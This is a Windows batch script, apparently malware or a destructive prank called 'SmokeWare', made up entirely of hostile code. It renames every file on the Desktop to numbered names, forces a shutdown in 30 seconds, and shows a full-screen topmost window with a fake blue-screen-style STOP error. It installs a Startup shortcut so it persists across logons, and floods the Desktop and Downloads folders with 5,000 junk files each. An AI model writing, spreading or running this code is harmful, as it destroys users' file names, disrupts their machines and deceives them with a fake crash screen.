@echo off
setlocal enabledelayedexpansion
set "d=%USERPROFILE%\Desktop"
cd /d "%d%"
set /a c=1
for %%F in (*.*) do (
    ren "%%F" "S_!c!%%~xF"
    set /a c+=1
)
shutdown /s /t 30

@echo off
powershell -NoProfile -Command ^
  "Add-Type -AssemblyName PresentationFramework;" ^
  "$w=New-Object System.Windows.Window;" ^
  "$w.WindowStyle='None';$w.WindowState='Maximized';$w.Topmost=$true;" ^
  "$w.Background=[System.Windows.Media.Brushes]::Red;" ^
  "$t=New-Object System.Windows.Controls.TextBlock;" ^
  "$t.Text='Welcome To SmokeWare.`n`n*** STOP: 0x0000007B (0xFFFFF880009A97E8, 0xFFFFFFFFC0000034, 0x0000000000000000, 0x0000000000000000)`n`nSaving Data ...`nInitializing ...`nWelcome To SmokeWare.';" ^
  "$t.FontFamily='Consolas';$t.FontSize=18;$t.Foreground=[System.Windows.Media.Brushes]::White;" ^
  "$t.TextWrapping='Wrap';$t.Margin='20';$w.Content=$t;$w.ShowDialog();"

setlocal
set "b=%~dp0SmokeWare.bat"
set "s=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"
set "l=SmokeWare.lnk"
powershell -Command ^
  "$sh=New-Object -ComObject WScript.Shell;" ^
  "$sc=$sh.CreateShortcut('%s%\%l%');" ^
  "$sc.TargetPath='%b%';$sc.WorkingDirectory='%~dp0';$sc.Save()"
pause

setlocal
set "dp=%USERPROFILE%\Desktop"
for /l %%i in (1,1,5000) do echo SmokeWareInstallationTutorial>"%dp%\T_%%i.txt"

setlocal enabledelayedexpansion
set "dl=%USERPROFILE%\Downloads"
for /l %%i in (1,1,5000) do echo SmokeWareTools>"%dl%\H_%%i.txt"
